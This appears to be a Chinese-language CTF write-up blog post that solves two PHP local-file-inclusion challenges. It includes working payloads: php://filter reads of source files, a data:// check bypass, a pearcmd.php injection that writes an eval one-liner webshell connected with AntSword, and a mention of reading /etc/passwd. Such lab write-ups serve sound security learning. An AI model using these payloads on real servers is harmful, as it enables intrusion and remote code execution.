---
title: ctf中的奇淫技巧-利用pearcmd进行LFI漏洞复现
date: 2022-1-12 16:19:21
tags:
---
第一题的write up如下:
先放flag

flag{H4v3_fvn_1NcIudE!}
第一题是比较基础的一个题
首先F12查看到html页面信息中包含了提示信息
简单的一个文件包含漏洞，查看url时候发现前面是filename=.....
遂猜测存在文件上传漏洞
于是构建payload如下：
```
http://39.106.13.193:8010/?filename=include%2Fflag.php&submit=提交查询
```

没有得到flag
于是想到了php伪协议
php伪协议有关知识点如下：
```
https://www.cnblogs.com/wjrblogs/p/12285202.html
```

参考这篇blog
PHP://
1. php://filter
作用：
读取源代码并进行base64编码输出
示例：
```
http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码）
```

参数说明：
resource=<要过滤的数据流> 这个参数是必须的。它指定了你要筛选过滤的数据流
read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
<；两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
构建最终的payload得到base64编码下的信息，进行解码后得到flag
```
http://39.106.13.193:8010/?filename=php://filter/read=convert.base64-encode/resource=include%2Fflag.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

第二题的write up：
首先flag是flag{1ncLud3_1s_1nt3R3sTiNg}
这个题有点历经千辛万苦了，了解到了文件的各种知识面。
1.check绕过
首先这个题的解题点在php自身的文件里面一个新的可以利用的LFI，这里的话参照p神的一篇文章是
Docker下php的裸文件绕过，blog链接如下
```
 https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html 
 ```

第一个地方就是绕过check变量的检测，这里涉及到了一个函数file_get_contents函数，该函数和file() 一样,只除了 file_get_contents() 把文件读入一个字符串 ，需要让他等于“LFI”这个字符串，这里就需要用到伪协议里面data了，关键知识点如下：
data://
#
作用：
 自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输

上面我发的blog里面有非常详细的关于php伪协议的知识。建议大家看一遍。我学到了很多通过这个blog，确实是我觉得最好的。
构建的payload如下：check=data://check/plain;base64,TEZJ（这里面的TEZJ是base64编码下的”LFI“字符串）。
这里你判断有没有成功绕过的话可以判断有没有执行die函数，如果没有绕过会有一个die"no"执行。

2.Include配合php中的pearcmd
include "a",这里了。
一开始我的想法是通过input://然后传入我想执行的代码来进行cat flag但发现我太天真了.....
首先需要了解一个关于docker下PHP裸文件本地包含漏洞
链接如下
```
https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
```

了解完相关知识后，我用的方法是不出网改本地配置的方法，原本想试一试通过本地服务器映射一个远程包含文件漏洞，但是配置出了点问题，所以配置了一下本地的。
这里的话对这个漏洞大致介绍一点：（附上以下blog，解释的十分的清晰）
```
https://blog.csdn.net/rfrder/article/details/121042290
```

补充一个知识点： url传参传入php文件是不行的，因为在传入的时候会给你编码导致无法传入，所以用burp改包的方法传入。
这里的话建议和我一样刚入门的师傅可以看一看如何利用burp进行改包发送。熟悉以下burp这个工具的使用，拦截后ctrl+R可以快速发给repeater。
```
https://blog.csdn.net/jinzhichaoshuiping/article/details/47324955
```

最后的payload如下:（部分有微小改动，便于大家思考）
```
?check=data://check/plain;base64,TEZJ&file=....../pearcmd.php&+-c+/tmp/***.php+-d+man_dir=<?eval($_POST[*]);?>+-s+
```

这里的话pearcmd路径并不是都一样的 有些环境下可能在/share里。
成功传入了我自己的马（在这里有一个方法可以测试是否传入成功，可以直接访问传入路径的传入文件，如果显示出了部分编码代表上传成功，无提示则上传失败）
然后通过antsword进行连接，经典一句话木马，连接成功。在目录下找到了flag
antsword下载地址附上
```
https://github.com/AntSwordProject/AntSword-Loader
```

该题也可以通过eval[_get[]]进行传马，因为本人水平有限，写入get失败，希望大佬指点一下利用get写入一句话shell后如何操作。具体思路师傅指点是可以利用里面的值进行执行代码操作。

最后补充一些做题时候意外发现的小技巧吧。如果靶机非动态的话利用伪协议可以阅读到一些你想知道的内容（如果有的话
通过这两个题学到了 远程文件上传（通过远程服务器包含shell），pearcmd LFI漏洞，顺便学习了如何用docker复现环境，当一些关键点卡住的时候可以手动本地搭建环境学习一下。
还有常见的一些目录日志文件，来访问服务器信息比如../../../etc/passwd等，暂时找不到那个博客了，有时间再找一找放上来。

顺便想问一下各位师傅，远程文件包含漏洞如果自己有服务器的话80端口用不了可以通过别的端口来进行包含上传shell么，今天没尝试出来
没错的话应该是第一次拿一血哈哈哈 挺开心
